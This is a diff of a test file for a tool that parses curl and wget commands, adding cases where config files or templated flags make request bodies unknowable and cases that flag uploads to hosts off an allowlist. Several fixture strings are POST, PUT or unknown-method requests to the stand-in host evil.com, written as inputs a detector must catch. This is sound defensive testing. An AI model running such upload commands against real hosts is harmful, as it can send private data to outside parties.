@@ -129,7 +129,14 @@ describe("a templated --expand-* body or a config file is a body that cannot be 
     expect(request(command)).toMatchObject({ method: UNKNOWN_METHOD, body: true, bodies: null });
   });
 
-  it.each(["curl -K cfg", "curl --config cfg https://h/"])("%s gives null bodies", (command) => {
+  it.each([
+    "curl -K cfg",
+    "curl --config cfg https://h/",
+    "curl --expand-config cfg https://h/",
+    "curl --expand-config=cfg https://h/",
+    "curl --expand-url 'https://h/{{p}}' -K cfg",
+    "curl --request-target /x -K cfg https://h/",
+  ])("%s gives null bodies", (command) => {
     expect(request(command).bodies).toBeNull();
   });
 
@@ -182,6 +189,9 @@ describe("an UNKNOWN method is still an upload to a host off the allowlist", () 
     ["curl -X POST https://evil.com --next https://example.com", ["evil.com", "example.com"]],
     ["curl -X PUT --request-target /x https://evil.com", ["evil.com", "unknown"]],
     ["curl --expand-request '{{m}}' https://evil.com", ["evil.com", "unknown"]],
+    ["curl --expand-config cfg https://evil.com", ["evil.com", "unknown"]],
+    ["curl --expand-config=cfg https://evil.com", ["evil.com", "unknown"]],
+    ["curl --expand-request-target /x https://evil.com", ["evil.com", "unknown"]],
     ['curl -X "$M" https://evil.com/x', ["evil.com"]],
     ['wget --method "$M" https://evil.com/x', ["evil.com"]],
   ])("%s flags %j", (command, hosts) => {
